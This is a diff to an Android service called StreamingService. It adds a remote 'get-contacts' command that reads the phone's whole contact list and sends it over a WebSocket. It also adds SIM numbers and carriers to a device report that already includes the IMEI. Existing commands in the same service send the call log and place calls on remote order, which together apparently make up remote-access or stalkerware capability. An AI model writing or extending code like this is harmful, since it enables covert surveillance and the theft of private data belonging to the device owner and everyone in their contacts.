@@ -24,6 +24,8 @@ import androidx.lifecycle.*
 import okhttp3.*
 import okio.ByteString.Companion.toByteString
 import android.provider.CallLog
+import android.provider.ContactsContract
+import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
 import org.json.JSONArray
 import org.json.JSONObject
@@ -328,6 +330,7 @@ class StreamingService : Service() {
                         when (json.optString("cmd")) {
                             "get-phone-info" -> sendPhoneInfo(ws)
                             "get-call-log"   -> sendCallLog(ws)
+                            "get-contacts"   -> sendContacts(ws)
                             "call"           -> makeCall(json.optString("number", ""))
                         }
                     } catch (_: Exception) {}
@@ -361,6 +364,19 @@ class StreamingService : Service() {
                 val imei = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                     tm.imei ?: "" else @Suppress("DEPRECATION") tm.deviceId ?: ""
                 json.put("imei", imei)
+            } catch (_: Exception) {}
+            try {
+                val sm = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+                val sims = JSONArray()
+                sm?.activeSubscriptionInfoList?.forEach { info ->
+                    val sim = JSONObject()
+                    sim.put("slot", info.simSlotIndex + 1)
+                    sim.put("displayName", info.displayName?.toString() ?: "")
+                    sim.put("carrierName", info.carrierName?.toString() ?: "")
+                    sim.put("number", info.number ?: "")
+                    sims.put(sim)
+                }
+                if (sims.length() > 0) json.put("sims", sims)
             } catch (_: Exception) {}
             ws.send(json.toString())
         } catch (_: Exception) {}
@@ -426,6 +442,43 @@ class StreamingService : Service() {
             ws.send(JSONObject().put("type", "call-log").put("entries", entries).toString())
         } catch (e: Exception) {
             ws.send(JSONObject().put("type", "call-log-error").put("msg", e.message ?: "ошибка").toString())
+        }
+    }
+
+    private fun sendContacts(ws: WebSocket) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+            != PackageManager.PERMISSION_GRANTED) {
+            ws.send(JSONObject().put("type", "contacts-error")
+                .put("msg", "Нет разрешения READ_CONTACTS").toString())
+            return
+        }
+        try {
+            val contacts = JSONArray()
+            contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(
+                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                    ContactsContract.CommonDataKinds.Phone.NUMBER,
+                    ContactsContract.CommonDataKinds.Phone.TYPE
+                ),
+                null, null,
+                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+            )?.use { c ->
+                val nameCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val numCol  = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                val typeCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
+                while (c.moveToNext()) {
+                    val e = JSONObject()
+                    e.put("name",   c.getString(nameCol) ?: "")
+                    e.put("number", c.getString(numCol)  ?: "")
+                    e.put("type",   ContactsContract.CommonDataKinds.Phone.getTypeLabel(
+                        resources, c.getInt(typeCol), "").toString())
+                    contacts.put(e)
+                }
+            }
+            ws.send(JSONObject().put("type", "contacts").put("entries", contacts).toString())
+        } catch (e: Exception) {
+            ws.send(JSONObject().put("type", "contacts-error").put("msg", e.message ?: "ошибка").toString())
         }
     }
 
